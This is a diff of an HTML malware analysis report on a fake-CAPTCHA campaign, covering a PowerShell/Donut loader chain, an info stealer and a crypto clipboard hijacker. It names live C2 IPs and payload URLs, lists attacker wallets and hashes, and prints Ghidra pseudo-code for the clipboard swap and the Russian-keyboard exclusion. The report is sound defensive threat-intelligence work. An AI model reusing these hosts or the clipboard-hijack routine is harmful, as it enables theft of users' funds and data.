+                    <tr>
+                        <td>3</td>
+                        <td>cvtres.exe</td>
+                        <td>Resource compilation</td>
+                        <td>Processes resources</td>
+                    </tr>
+                    <tr>
+                        <td>4</td>
+                        <td>csc.exe</td>
+                        <td>Creates .dll file</td>
+                        <td>Bridge DLL with Win32 APIs</td>
+                    </tr>
+                    <tr>
+                        <td>5</td>
+                        <td>PowerShell</td>
+                        <td>Loads DLL, deletes files</td>
+                        <td><strong>Fileless execution</strong></td>
+                    </tr>
+                </table></div>
                 
                 <div class="highlight-box">
-                    <h3>VirusTotal Results for cs.bin</h3>
-                    <table style="margin: 0;">
-                        <tr>
-                            <td><strong>Verdict</strong></td>
-                            <td><span class="tag tag-danger">Malicious</span> (GTI Score: 60/100)</td>
-                        </tr>
-                        <tr>
-                            <td><strong>Threat Label</strong></td>
-                            <td><code>trojan.donut/marte</code></td>
-                        </tr>
-                        <tr>
-                            <td><strong>Family Labels</strong></td>
-                            <td><code>donut</code>, <code>marte</code>, <code>shellcode</code></td>
-                        </tr>
-                    </table></div>
-                </div>
-                
-                <h3 style="color: var(--accent); margin-top: 25px;">.NET Assembly Proof</h3>
-                <p>
-                    The encrypted .NET assembly inside cs.bin is decrypted at runtime by cptchbuild.bin and loaded into memory. 
-                    Searching the memory dump for .NET-specific patterns confirms this:
-                </p>
-                
-                <div class="evidence-box">
-                    <div class="evidence-header">Evidence: .NET Assembly Indicators in Memory</div>
-                    <img src="12-dotnet-assembly-evidence.png" alt=".NET Evidence">
-                    <div class="evidence-caption">
-                        Memory dump analysis showing .NET-specific patterns including C# auto-property backing fields 
-                        and Telegram API method calls, confirming the payload is a .NET info stealer.
-                    </div>
-                </div>
-                
-                <div class="code-block">
-                    <div class="code-header">.NET Evidence from Memory Dump</div>
-                    <div class="code-content"># C# Auto-Property Backing Fields (compiler-generated)
-PS> Select-String -Path "cptchbuild_dmp_output.txt" -Pattern "k__BackingField"
-
-cptchbuild_dmp_output.txt:3302:&lt;CommandX64&gt;k__BackingField
-cptchbuild_dmp_output.txt:3303:&lt;Key4&gt;k__BackingField
-cptchbuild_dmp_output.txt:3304:&lt;CommandX86&gt;k__BackingField
-cptchbuild_dmp_output.txt:3305:&lt;Data&gt;k__BackingField
-cptchbuild_dmp_output.txt:3306:&lt;WebData&gt;k__BackingField
-
-# C# Property Accessors
-PS> Select-String -Path "cptchbuild_dmp_output.txt" -Pattern "get_Telegram|set_Telegram|get_Discord"
-
-cptchbuild_dmp_output.txt:3616:get_Discords
-cptchbuild_dmp_output.txt:3669:get_Telegrams
-cptchbuild_dmp_output.txt:3670:set_Telegrams
-
-# Telegram Bot API Methods
-PS> Select-String -Path "cptchbuild_dmp_output.txt" -Pattern "SendDocument|SendMessage"
-
-cptchbuild_dmp_output.txt:53491:SendMessage
-cptchbuild_dmp_output.txt:68833:SendMessage</div>
-                </div>
-                
-                <h3 style="color: var(--accent); margin-top: 20px;">.NET Evidence Summary</h3>
-                <div class="table-wrapper"><table>
-                    <tr>
-                        <th>Pattern Found</th>
-                        <th>What It Proves</th>
-                        <th>Implication</th>
-                    </tr>
-                    <tr>
-                        <td><code>k__BackingField</code></td>
-                        <td>C# compiler auto-property pattern</td>
-                        <td><strong>.NET Assembly confirmed</strong></td>
-                    </tr>
-                    <tr>
-                        <td><code>get_Telegrams</code>, <code>set_Telegrams</code></td>
-                        <td>C# property getter/setter</td>
-                        <td>Telegram data collection</td>
-                    </tr>
-                    <tr>
-                        <td><code>get_Discords</code></td>
-                        <td>C# property getter</td>
-                        <td>Discord token theft</td>
-                    </tr>
-                    <tr>
-                        <td><code>&lt;CommandX64&gt;</code>, <code>&lt;CommandX86&gt;</code></td>
-                        <td>Multi-architecture support</td>
-                        <td>Works on 32-bit and 64-bit</td>
-                    </tr>
-                    <tr>
-                        <td><code>SendMessage</code></td>
-                        <td>Telegram Bot API</td>
-                        <td>Data exfiltration method</td>
-                    </tr>
-                </table></div>
-                
-                <div class="highlight-box" style="border-color: var(--accent2); margin-top: 25px;">
-                    <h3 style="color: var(--accent2);">Conclusion: cs.bin Contains .NET Info Stealer</h3>
-                    <p style="margin: 0;">
-                        The presence of <code>k__BackingField</code> patterns definitively proves cs.bin contains a 
-                        <strong>.NET/C# assembly</strong>. The property names (<code>get_Telegrams</code>, <code>get_Discords</code>) 
-                        and API methods (<code>SendMessage</code>) confirm it is an <strong>info stealer</strong> that 
-                        targets Discord/Telegram and exfiltrates via the Telegram Bot API.
+                    <h3>Why This Technique?</h3>
+                    <p>
+                        PowerShell cannot directly call Windows APIs like <code>VirtualAlloc</code> and <code>CreateThread</code>. 
+                        The attacker uses <code>Add-Type</code> to compile C# code declaring these APIs, creating a temporary 
+                        "bridge" DLL. Once loaded into memory, the temporary files are deleted, achieving <strong>fileless execution</strong> 
+                        that evades traditional file-based detection.
                     </p>
                 </div>
             </div>
         </section>
 
-        <!-- Section 7: Complete Attack Chain (Recap) -->
+        <!-- Section 7: Cryptocurrency Clipboard Hijacker - MAJOR NEW SECTION -->
         <section>
             <div class="section-header">
-                <div class="section-number">7</div>
-                <h2>Complete Attack Chain - Summary</h2>
+                <div class="section-number danger">7</div>
+                <h2>Cryptocurrency Clipboard Hijacker Analysis</h2>
             </div>
             <div class="section-content">
                 <p>
-                    Based on the analysis above, the following 5-stage attack chain was identified:
+                    During live execution, the C2 server delivered <code>clipx64.bin</code> — a <strong>cryptocurrency 
+                    clipboard hijacker</strong> (Marte family). This malware monitors the Windows clipboard for 
+                    cryptocurrency wallet addresses and silently replaces them with attacker-controlled addresses.
+                </p>
+                
+                <div class="highlight-box critical">
+                    <h3>How Clipboard Hijacking Steals Money</h3>
+                    <p>
+                        When a victim copies a cryptocurrency address (e.g., to send payment), the malware:
+                    </p>
+                    <ol style="margin: 10px 0 0 20px; line-height: 2;">
+                        <li>Detects the wallet address pattern in clipboard</li>
+                        <li>Silently replaces it with the attacker's wallet</li>
+                        <li>Victim pastes the address and sends funds</li>
+                        <li><strong>Money goes to attacker instead of intended recipient</strong></li>
+                    </ol>
+                </div>
+
+                <h3 style="color: var(--accent2); margin-top: 25px;">Live Behavioral Verification</h3>
+                <p>
+                    The clipboard hijacking was verified by running the malware and testing with a Bitcoin address:
+                </p>
+                
+                <div class="code-block">
+                    <div class="code-header">PowerShell Test Script</div>
+                    <div class="code-content"># Test victim's Bitcoin address
+$testBTC = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
+Set-Clipboard -Value $testBTC
+Start-Sleep -Seconds 2
+$result = Get-Clipboard
+
+# Result: Address was REPLACED with attacker's wallet!
+# Original: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa (Satoshi's address)
+# Hijacked: 113AiBfBwD16qFmPTRW54ATKyu6fcC7w3i (Attacker's wallet)</div>
+                </div>
+
+                <div class="evidence-box">
+                    <div class="evidence-header critical">Evidence: LIVE Clipboard Hijacking Captured!</div>
+                    <img src="25-clipboard-hijack-live-test.png" alt="Live Hijack Evidence">
+                    <div class="evidence-caption">
+                        <strong>Smoking Gun:</strong> PowerShell test proving the clipboard hijacker is active. 
+                        The victim's Bitcoin address was replaced with the attacker's wallet in real-time.
+                    </div>
+                </div>
+
+                <div class="evidence-box">
+                    <div class="evidence-header warning">Evidence: Point of View - Victim's Hijacked Wallet</div>
+                    <img src="26-hijacked-wallet-victim-pov.png" alt="Hijacked Wallet POV">
+                    <div class="evidence-caption">
+                        Demonstration of what a victim would see — the pasted address appears legitimate but 
+                        belongs to the attacker.
+                    </div>
+                </div>
+
+                <h3 style="color: var(--accent3); margin-top: 25px;">17 Hardcoded Attacker Wallets</h3>
+                <p>
+                    Static analysis revealed <strong>17 cryptocurrency wallet addresses</strong> hardcoded in the malware, 
+                    targeting multiple cryptocurrencies:
+                </p>
+
+                <div class="evidence-box">
+                    <div class="evidence-header warning">Evidence: Cryptocurrency Addresses Extracted</div>
+                    <img src="27-strings-attacker-wallets.png" alt="Crypto Addresses">
+                    <div class="evidence-caption">
+                        CyberChef/Strings analysis showing the 17 attacker wallet addresses embedded in clipx64.bin.
+                    </div>
+                </div>
+
+                <div class="evidence-box">
+                    <div class="evidence-header warning">Evidence: Targeted Cryptocurrency Types</div>
+                    <img src="28-strings-crypto-types-targeted.png" alt="Crypto Names">
+                    <div class="evidence-caption">
+                        String patterns showing the cryptocurrency types targeted: Bitcoin (Legacy/SegWit/Taproot), 
+                        Ethereum, Litecoin, Dogecoin, Solana, and more.
+                    </div>
+                </div>
+                
+                <div class="crypto-grid">
+                    <div class="crypto-item">
+                        <div class="name">Bitcoin (Legacy)</div>
+                        <div class="address">113AiBfBwD16qFmPTRW54ATKyu6fcC7w3i</div>
+                    </div>
+                    <div class="crypto-item">
+                        <div class="name">Bitcoin (SegWit)</div>
+                        <div class="address">bc1qpyz9ntlt6zqhts934n0ryf5rf3tv8xyrw02yz2</div>
+                    </div>
+                    <div class="crypto-item">
+                        <div class="name">Bitcoin (Taproot)</div>
+                        <div class="address">bc1pswd5y0364x0k7ymjn3dvy2epm4wqykc2gcg9ck3ay3shmkn4z63qfnfwam</div>
+                    </div>
+                    <div class="crypto-item">
+                        <div class="name">Ethereum</div>
+                        <div class="address">0x1Ef52d5107493Cd358F77433Cf58dB3F737cA1d2</div>
+                    </div>
+                    <div class="crypto-item">
+                        <div class="name">Tron (TRX)</div>
+                        <div class="address">TEamns9s9bBqkxu45QvXErZJ3hiinfHfqP</div>
+                    </div>
+                    <div class="crypto-item">
+                        <div class="name">Ripple (XRP)</div>
+                        <div class="address">rBQBZLCnAJ4x8JoQRU9qugVUmbf2K2nFto</div>
+                    </div>
+                    <div class="crypto-item">
+                        <div class="name">Litecoin (Legacy)</div>
+                        <div class="address">LZyrWTD4opAXitc9sdFpt58aty7hUvCfq2</div>
+                    </div>
+                    <div class="crypto-item">
+                        <div class="name">Litecoin (SegWit)</div>
+                        <div class="address">ltc1q7arvxksmmfr6y72j4yaas3n8tkdeq48rjjnl33</div>
+                    </div>
+                    <div class="crypto-item">
+                        <div class="name">Dogecoin</div>
+                        <div class="address">DEJSQbfr5ijcGuvsgceYmNW169bsT2U7Zo</div>
+                    </div>
+                    <div class="crypto-item">
+                        <div class="name">Solana</div>
+                        <div class="address">7mnSBw4LXS8vz44LJuAzwdMxBSQrKjZNto5r7EJXnYQ1</div>
+                    </div>
+                    <div class="crypto-item">
+                        <div class="name">Cardano (ADA)</div>
+                        <div class="address">addr1q9xdz0sszfqdq0qfmg408ufkewhnr5x4dusywd74ved86ama2gwaev8zgkwyd3hhnaxtr8grqmcpnl3kujelt85ap7xqkfvfne</div>
+                    </div>
+                    <div class="crypto-item">
+                        <div class="name">Stellar (XLM)</div>
+                        <div class="address">GCLK3ESKRM2FT6WCEBUYOIXBKE35NYOO2P7Z7SISFDZX6MDJET3F2QO7</div>
+                    </div>
+                    <div class="crypto-item">
+                        <div class="name">Cosmos (ATOM)</div>
+                        <div class="address">cosmos18l2zuevy2laedm852xncqpxg8ckzsrgql2k2yj</div>
+                    </div>
+                    <div class="crypto-item">
+                        <div class="name">Binance (BNB)</div>
+                        <div class="address">bnb1jzt8kxskklklar4lsmrpkqgc73rh8sxf9erzwu</div>
+                    </div>
+                    <div class="crypto-item">
+                        <div class="name">Filecoin (FIL)</div>
+                        <div class="address">f1t5beqcemmbkzh5m4xvp22u2n6xaje5vbvtpmm2a</div>
+                    </div>
+                    <div class="crypto-item">
+                        <div class="name">Osmosis (OSMO)</div>
+                        <div class="address">osmo18l2zuevy2laedm852xncqpxg8ckzsrgqh396jq</div>
+                    </div>
+                    <div class="crypto-item">
+                        <div class="name">QTUM</div>
+                        <div class="address">QducRt3LATroCQUUxrYq96ZqpQxm4QbTsc</div>
+                    </div>
+                </div>
+
+                <h3 style="color: var(--accent); margin-top: 25px;">API Functions Evidence</h3>
+
+                <div class="evidence-box">
+                    <div class="evidence-header">Evidence: Clipboard API Strings</div>
+                    <img src="29-api-clipboard-functions.png" alt="API Strings">
+                    <div class="evidence-caption">
+                        Windows API function strings extracted from clipx64.bin: OpenClipboard, GetClipboardData, 
+                        SetClipboardData, CloseClipboard — the core clipboard manipulation APIs.
+                    </div>
+                </div>
+
+                <h3 style="color: var(--accent); margin-top: 25px;">Anti-Analysis Features</h3>
+                <div class="table-wrapper"><table>
+                    <tr>
+                        <th>Feature</th>
+                        <th>API/Value</th>
+                        <th>Purpose</th>
+                    </tr>
+                    <tr>
+                        <td>Debugger Detection</td>
+                        <td><code>IsDebuggerPresent</code></td>
+                        <td>Detect local debugging</td>
+                    </tr>
+                    <tr>
+                        <td>Remote Debugger Check</td>
+                        <td><code>CheckRemoteDebuggerPresent</code></td>
+                        <td>Detect remote analysis</td>
+                    </tr>
+                    <tr>
+                        <td>Single Instance</td>
+                        <td><code>CryptoClipboardMonitorMutex</code></td>
+                        <td>Prevent multiple executions</td>
+                    </tr>
+                    <tr>
+                        <td>Regional Check</td>
+                        <td><code>GetKeyboardLayout() == 0x419</code></td>
+                        <td><span class="tag tag-russian">Exclude Russian victims</span></td>
+                    </tr>
+                </table></div>
+            </div>
+        </section>
+
+        <!-- Section 8: Ghidra Reverse Engineering -->
+        <section>
+            <div class="section-header">
+                <div class="section-number danger">8</div>
+                <h2>Reverse Engineering Evidence - Ghidra Analysis</h2>
+            </div>
+            <div class="section-content">
+                <p>
+                    The clipboard hijacker binary was decompiled using <strong>Ghidra</strong> to obtain C-like pseudo-code. 
+                    This revealed the exact implementation of the Russian keyboard check and clipboard swap mechanism.
+                </p>
+
+                <h3 style="color: var(--accent2); margin-top: 20px;">Russian Keyboard Check (0x419) - Proof of Origin</h3>
+                <p>
+                    The malware checks if the system has a Russian keyboard layout (LCID <code>0x419</code>) and 
+                    <strong>exits immediately if detected</strong> — a common technique used by Russian cybercriminals 
+                    to avoid infecting Russian systems.
+                </p>
+
+                <div class="evidence-box">
+                    <div class="evidence-header critical">Evidence: Ghidra - Russian Check Code (0x419)</div>
+                    <img src="30-ghidra-russian-check-0x419.png" alt="Russian Check Ghidra">
+                    <div class="evidence-caption">
+                        <strong>Proof of Russian Origin:</strong> Ghidra decompilation showing the exact code that checks 
+                        for Russian keyboard layout (0x419). If detected, the malware returns 1 (exits), protecting Russian users.
+                    </div>
+                </div>
+
+                <div class="code-block">
+                    <div class="code-header">Ghidra Decompiled Code - Russian Check Function</div>
+                    <div class="code-content">// Function: FUN_1400014bc - Russian Keyboard Check
+local_18 = GetKeyboardLayout(0);
+local_1a = (short)local_18;
+
+if ((local_1a == 0x419) || (local_1a == 0x419)) {
+    uVar1 = 1;  // Russian detected → EXIT
+}
+else {
+    // Check all installed keyboard layouts
+    local_20 = GetKeyboardLayoutList(10, local_78);
+    for (local_c = 0; local_c < local_20; local_c = local_c + 1) {
+        local_22 = (short)local_78[local_c];
+        if ((local_1a == 0x419) || (local_22 == 0x419)) {
+            return 1;  // Russian in list → EXIT
+        }
+    }
+}
+return uVar1;  // Not Russian → Continue attack</div>
+                </div>
+
+                <div class="highlight-box critical">
+                    <h3>What 0x419 Means</h3>
+                    <p>
+                        <code>0x419</code> is the Windows Language Code Identifier (LCID) for <strong>Russian</strong>. 
+                        This code explicitly excludes Russian-speaking users from being targeted — a hallmark of 
+                        Eastern European cybercrime operations. The malware authors are protecting their own countrymen.
+                    </p>
+                </div>
+
+                <h3 style="color: var(--accent2); margin-top: 25px;">Clipboard Swap Mechanism - SetClipboardData</h3>
+                <p>
+                    Ghidra also revealed the exact function that performs the wallet address replacement:
+                </p>
+
+                <div class="evidence-box">
+                    <div class="evidence-header critical">Evidence: Ghidra - Clipboard Swap Function</div>
+                    <img src="31-ghidra-clipboard-swap-function.png" alt="Clipboard Swap Ghidra">
+                    <div class="evidence-caption">
+                        <strong>The Attack Mechanism:</strong> Decompiled function showing OpenClipboard, EmptyClipboard, 
+                        GlobalAlloc, strcpy (copy attacker's wallet), and SetClipboardData — the complete clipboard hijack.
+                    </div>
+                </div>
+
+                <div class="code-block">
+                    <div class="code-header">Ghidra Decompiled Code - Clipboard Swap Function</div>
+                    <div class="code-content">// Function: FUN_14000177e - Replace Clipboard Content
+undefined8 FUN_14000177e(char *param_1) {  // param_1 = attacker's wallet address
+    BOOL bVar1;
+    HGLOBAL hMem;
+    LPVOID pDest;
+
+    bVar1 = OpenClipboard((HWND)0x0);       // Open clipboard
+    if (bVar1 != 0) {
+        EmptyClipboard();                    // Clear current content
+        hMem = GlobalAlloc(0x42, strlen(param_1) + 1);  // Allocate memory
+        pDest = GlobalLock(hMem);            // Lock memory
+        strcpy(pDest, param_1);              // Copy ATTACKER'S wallet address
+        GlobalUnlock(hMem);                  // Unlock memory
+        SetClipboardData(1, hMem);           // 1 = CF_TEXT, set new content
+        CloseClipboard();                    // Close clipboard
+    }
+    return 0;
+}</div>
+                </div>
+
+                <div class="highlight-box">
+                    <h3>How the Swap Works</h3>
+                    <ol style="margin: 10px 0 0 20px; line-height: 2;">
+                        <li><code>OpenClipboard(0)</code> — Gain access to the clipboard</li>
+                        <li><code>EmptyClipboard()</code> — Remove the victim's copied address</li>
+                        <li><code>GlobalAlloc + strcpy</code> — Prepare attacker's wallet address</li>
+                        <li><code>SetClipboardData(CF_TEXT, ...)</code> — Replace with attacker's wallet</li>
+                        <li>Victim pastes → <strong>Sends money to attacker!</strong></li>
+                    </ol>
+                </div>
+            </div>
+        </section>
+
+        <!-- Section 9: Complete Attack Chain -->
+        <section>
+            <div class="section-header">
+                <div class="section-number">9</div>
+                <h2>Complete Attack Chain</h2>
+            </div>
+            <div class="section-content">
+                <p>
+                    Based on the comprehensive analysis, the following <strong>5-stage modular attack chain</strong> was identified:
                 </p>
                 <div class="attack-chain">
                     <div class="chain-stage">
                         <div class="stage-num">1</div>
                         <div class="stage-info">
                             <h4>DROPPER</h4>
-                            <p><span class="ioc-value">158.94.209.33</span> — Displays "Wait please...", launches hidden PowerShell process</p>
+                            <p><span class="ioc-value">158.94.209.33</span> — Displays "Wait please...", launches hidden PowerShell</p>
                         </div>
                     </div>
                     <div class="stage-arrow">↓</div>
@@ -1112,7 +1378,7 @@ cptchbuild_dmp_output.txt:68833:SendMessage</div>
                         <div class="stage-num">2</div>
                         <div class="stage-info">
                             <h4>SHELLCODE LOADER</h4>
-                            <p><span class="ioc-value">178.16.53.70</span> — Downloads shellcode, uses VirtualAlloc + CreateThread for execution</p>
+                            <p><span class="ioc-value">178.16.53.70</span> — Downloads shellcode, uses VirtualAlloc + CreateThread via .NET bridge</p>
                         </div>
                     </div>
                     <div class="stage-arrow">↓</div>
@@ -1120,7 +1386,7 @@ cptchbuild_dmp_output.txt:68833:SendMessage</div>
                         <div class="stage-num">3</div>
                         <div class="stage-info">
                             <h4>DONUT SHELLCODE</h4>
-                            <p><span class="ioc-value">cptch.bin</span> (52,811 bytes) — Position-independent shellcode, decrypts payload in memory</p>
+                            <p><span class="ioc-value">cptch.bin</span> — Position-independent shellcode, decrypts next stage</p>
                         </div>
                     </div>
                     <div class="stage-arrow">↓</div>
@@ -1128,31 +1394,49 @@ cptchbuild_dmp_output.txt:68833:SendMessage</div>
                         <div class="stage-num">4</div>
                         <div class="stage-info">
                             <h4>STEALER LOADER</h4>
-                            <p><span class="ioc-value">cptchbuild.bin</span> (186,955 bytes) — Secondary encrypted payload, loads stealer component</p>
+                            <p><span class="ioc-value">cptchbuild.bin</span> — Secondary loader, fetches final payload from C2</p>
                         </div>
                     </div>
-                    <div class="stage-arrow">↓</div>
-                    <div class="chain-stage">
-                        <div class="stage-num">5</div>
-                        <div class="stage-info">
-                            <h4>INFO STEALER (Marte Family)</h4>
-                            <p><span class="ioc-value">cs.bin</span> (84,043 bytes) — Donut-wrapped .NET assembly, verified via <code>k__BackingField</code> patterns, exfiltrates via Telegram Bot API</p>
+                    <div class="stage-fork">↓ MODULAR PAYLOAD SELECTION ↓</div>
+                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
+                        <div class="chain-stage final">
+                            <div class="stage-num">5A</div>
+                            <div class="stage-info">
+                                <h4>INFO STEALER (Lumma)</h4>
+                                <p><span class="ioc-value">cs.bin</span> — Browser/wallet theft, Telegram exfiltration</p>
+                            </div>
                         </div>
+                        <div class="chain-stage alt">
+                            <div class="stage-num">5B</div>
+                            <div class="stage-info">
+                                <h4>CRYPTO CLIPPER (Marte)</h4>
+                                <p><span class="ioc-value">clipx64.bin</span> — 17 wallets, Russian exclusion</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="evidence-box">
+                    <div class="evidence-header">Evidence: Procmon - Complete Process Tree</div>
+                    <img src="20-procmon-process-tree.png" alt="Procmon Tree">
+                    <div class="evidence-caption">
+                        Process Monitor process tree showing the complete attack execution flow from initial 
+                        PowerShell to shellcode execution.
                     </div>
                 </div>
             </div>
         </section>
 
-        <!-- Section 8: Live Campaign Verification -->
+        <!-- Section 10: Live Campaign -->
         <section>
             <div class="section-header">
-                <div class="section-number">8</div>
+                <div class="section-number">10</div>
                 <h2>Live Campaign Verification</h2>
             </div>
             <div class="section-content">
                 <p>
-                    To confirm this is an <strong>actively running campaign</strong>, all C2 servers were tested 
-                    to verify they are still serving malicious payloads at the time of analysis.
+                    All C2 servers were tested to confirm the campaign is <strong>actively running</strong> 
+                    and serving malicious payloads.
                 </p>
                 
                 <div class="code-block">
@@ -1168,26 +1452,28 @@ foreach ($url in $urls) {
     Write-Host "STATUS: $($response.StatusCode) - LIVE!"
 }
 
-# Results:
-Testing: http://158.94.209.33
-  STATUS: 200 - LIVE!
-Testing: http://178.16.53.70
-  STATUS: 200 - LIVE!
-Testing: http://94.154.35.115/user_profiles_photo/cptch.bin
-  STATUS: 200 - LIVE!</div>
+# Results: All servers returned HTTP 200 - ACTIVE!</div>
                 </div>
                 
                 <div class="evidence-box">
-                    <div class="evidence-header">Evidence 12: All C2 Servers Actively Serving Malware</div>
-                    <img src="14-live-c2-servers-active.png" alt="Live Campaign Proof">
+                    <div class="evidence-header critical">Evidence: All C2 Servers Active</div>
+                    <img src="14-live-c2-servers-active.png" alt="Live C2 Servers">
                     <div class="evidence-caption">
-                        All three C2 servers return HTTP 200, confirming the campaign is <strong>actively running</strong> 
-                        and serving malicious payloads at the time of analysis (February 8, 2026).
+                        All three C2 servers return HTTP 200, confirming the campaign is <strong>actively running</strong>.
+                    </div>
+                </div>
+
+                <div class="evidence-box">
+                    <div class="evidence-header">Evidence: C2 Disconnection After Execution</div>
+                    <img src="18-c2-server-disconnect.png" alt="C2 Disconnect">
+                    <div class="evidence-caption">
+                        Network connections to C2 servers after payload delivery completes, showing 
+                        the malware's communication pattern.
                     </div>
                 </div>
                 
-                <div class="highlight-box" style="border-color: var(--accent2);">
-                    <h3 style="color: var(--accent2);">Campaign Status: ACTIVE</h3>
+                <div class="highlight-box critical">
+                    <h3>Campaign Status: ACTIVE</h3>
                     <table style="margin: 0;">
                         <tr>
                             <th>C2 Server</th>
@@ -1196,34 +1482,28 @@ Testing: http://94.154.35.115/user_profiles_photo/cptch.bin
                         </tr>
                         <tr>
                             <td><span class="ioc-value">158.94.209.33</span></td>
-                            <td><span class="tag tag-danger">LIVE (HTTP 200)</span></td>
+                            <td><span class="tag tag-danger">LIVE</span></td>
                             <td>Stage 1 Dropper</td>
                         </tr>
                         <tr>
                             <td><span class="ioc-value">178.16.53.70</span></td>
-                            <td><span class="tag tag-danger">LIVE (HTTP 200)</span></td>
-                            <td>Stage 2 Shellcode Loader</td>
+                            <td><span class="tag tag-danger">LIVE</span></td>
+                            <td>Stage 2 Loader</td>
                         </tr>
                         <tr>
                             <td><span class="ioc-value">94.154.35.115</span></td>
-                            <td><span class="tag tag-danger">LIVE (HTTP 200)</span></td>
-                            <td>Payload Server (cptch.bin, cptchbuild.bin, cs.bin)</td>
+                            <td><span class="tag tag-danger">LIVE</span></td>
+                            <td>Payload Server</td>
                         </tr>
-                    </table></div>
+                    </table>
                 </div>
-                
-                <p style="margin-top: 20px;">
-                    <strong>This confirms the attack infrastructure is fully operational</strong> and victims who 
-                    fall for the fake CAPTCHA will receive live malware payloads. Immediate blocking of these 
-                    IP addresses is recommended.
-                </p>
             </div>
         </section>
 
-        <!-- Section 9: IOCs -->
+        <!-- Section 11: IOCs -->
         <section>
             <div class="section-header">
-                <div class="section-number">9</div>
+                <div class="section-number">11</div>
                 <h2>Indicators of Compromise (IOCs)</h2>
             </div>
             <div class="section-content">
@@ -1260,10 +1540,16 @@ Testing: http://94.154.35.115/user_profiles_photo/cptch.bin
                         <td>Stealer loader</td>
                     </tr>
                     <tr>
-                        <td>5</td>
+                        <td>5A</td>
                         <td><span class="ioc-value">94.154.35.115</span></td>
                         <td>/user_profiles_photo/cs.bin</td>
-                        <td>Info stealer</td>
+                        <td>Lumma Stealer</td>
+                    </tr>
+                    <tr>
+                        <td>5B</td>
+                        <td><span class="ioc-value">94.154.35.115</span></td>
+                        <td>/user_profiles_photo/clipx64.bin</td>
+                        <td>Crypto Clipper</td>
                     </tr>
                 </table></div>
                 
@@ -1273,30 +1559,95 @@ Testing: http://94.154.35.115/user_profiles_photo/cptch.bin
                         <th>Filename</th>
                         <th>SHA256</th>
                         <th>Size</th>
+                        <th>Type</th>
                     </tr>
                     <tr>
                         <td>cptch.bin</td>
-                        <td><span class="ioc-value" style="font-size: 0.7em;">35EC1234DA4E6433A797E5BA719E3A6B2CB455A8C3815601074B3FEF7BBC9B39</span></td>
-                        <td>52,811 bytes</td>
+                        <td><span class="ioc-value" style="font-size: 0.65em;">35EC1234DA4E6433A797E5BA719E3A6B2CB455A8C3815601074B3FEF7BBC9B39</span></td>
+                        <td>52 KB</td>
+                        <td>Donut</td>
                     </tr>
                     <tr>
                         <td>cptchbuild.bin</td>
-                        <td><span class="ioc-value" style="font-size: 0.7em;">23A240D9B928D7E35074D8C05CD5A8E6EDB0FFCC75A628CF7D5F6A952E2679B5</span></td>
-                        <td>186,955 bytes</td>
+                        <td><span class="ioc-value" style="font-size: 0.65em;">23A240D9B928D7E35074D8C05CD5A8E6EDB0FFCC75A628CF7D5F6A952E2679B5</span></td>
+                        <td>186 KB</td>
+                        <td>Loader</td>
                     </tr>
                     <tr>
                         <td>cs.bin</td>
-                        <td><span class="ioc-value" style="font-size: 0.7em;">8A1DB4433E20B71698F63199B97C8A94DDA167CB24A169B0FC1092B1FB5E3CE0</span></td>
-                        <td>84,043 bytes</td>
+                        <td><span class="ioc-value" style="font-size: 0.65em;">8A1DB4433E20B71698F63199B97C8A94DDA167CB24A169B0FC1092B1FB5E3CE0</span></td>
+                        <td>84 KB</td>
+                        <td>Lumma</td>
+                    </tr>
+                    <tr>
+                        <td>clipx64.bin</td>
+                        <td><span class="ioc-value" style="font-size: 0.65em;">A609325C84A73341FEA831FFDB3E29C8D9C1619EB09669CF489ABDF9955B4DD6</span></td>
+                        <td>67 KB</td>
+                        <td>Clipper</td>
+                    </tr>
+                </table></div>
+
+                <h3 style="color: var(--accent3); margin-top: 25px;">Attacker Wallet Addresses</h3>
+                <div class="table-wrapper"><table>
+                    <tr>
+                        <th>Cryptocurrency</th>
+                        <th>Attacker Wallet Address</th>
+                    </tr>
+                    <tr>
+                        <td>Bitcoin (Legacy)</td>
+                        <td><span class="wallet-value">113AiBfBwD16qFmPTRW54ATKyu6fcC7w3i</span></td>
+                    </tr>
+                    <tr>
+                        <td>Bitcoin (SegWit)</td>
+                        <td><span class="wallet-value">bc1qpyz9ntlt6zqhts934n0ryf5rf3tv8xyrw02yz2</span></td>
+                    </tr>
+                    <tr>
+                        <td>Ethereum</td>
+                        <td><span class="wallet-value">0x1Ef52d5107493Cd358F77433Cf58dB3F737cA1d2</span></td>
+                    </tr>
+                    <tr>
+                        <td>Solana</td>
+                        <td><span class="wallet-value">7mnSBw4LXS8vz44LJuAzwdMxBSQrKjZNto5r7EJXnYQ1</span></td>
+                    </tr>
+                    <tr>
+                        <td>Tron</td>
+                        <td><span class="wallet-value">TEamns9s9bBqkxu45QvXErZJ3hiinfHfqP</span></td>
+                    </tr>
+                </table></div>
+                <p style="color: var(--text-muted); font-size: 0.85em; margin-top: 10px;">
+                    Full list of 17 wallet addresses available in Section 7.
+                </p>
+
+                <h3 style="color: var(--accent); margin-top: 25px;">Behavioral Indicators</h3>
+                <div class="table-wrapper"><table>
+                    <tr>
+                        <th>Indicator</th>
+                        <th>Value</th>
+                        <th>Context</th>
+                    </tr>
+                    <tr>
+                        <td>Mutex</td>
+                        <td><code>CryptoClipboardMonitorMutex</code></td>
+                        <td>Single instance enforcement</td>
+                    </tr>
+                    <tr>
+                        <td>Russian LCID</td>
+                        <td><code>0x419</code></td>
+                        <td>Excluded keyboard layout</td>
+                    </tr>
+                    <tr>
+                        <td>User-Agent</td>
+                        <td><code>Mozilla/5.0</code></td>
+                        <td>C2 communications</td>
                     </tr>
                 </table></div>
             </div>
         </section>
 
-        <!-- Section 10: MITRE ATT&CK -->
+        <!-- Section 12: MITRE ATT&CK -->
         <section>
             <div class="section-header">
-                <div class="section-number">10</div>
+                <div class="section-number">12</div>
                 <h2>MITRE ATT&CK Mapping</h2>
             </div>
             <div class="section-content">
@@ -1314,7 +1665,7 @@ Testing: http://94.154.35.115/user_profiles_photo/cptch.bin
                     <tr>
                         <td><code>T1059.001</code></td>
                         <td>PowerShell</td>
-                        <td>All stages use PowerShell execution</td>
+                        <td>All stages use PowerShell</td>
                     </tr>
                     <tr>
                         <td><code>T1055</code></td>
@@ -1327,9 +1678,14 @@ Testing: http://94.154.35.115/user_profiles_photo/cptch.bin
                         <td>Donut shellcode, fileless execution</td>
                     </tr>
                     <tr>
+                        <td><code>T1115</code></td>
+                        <td>Clipboard Data</td>
+                        <td>Clipboard hijacking for crypto theft</td>
+                    </tr>
+                    <tr>
                         <td><code>T1555</code></td>
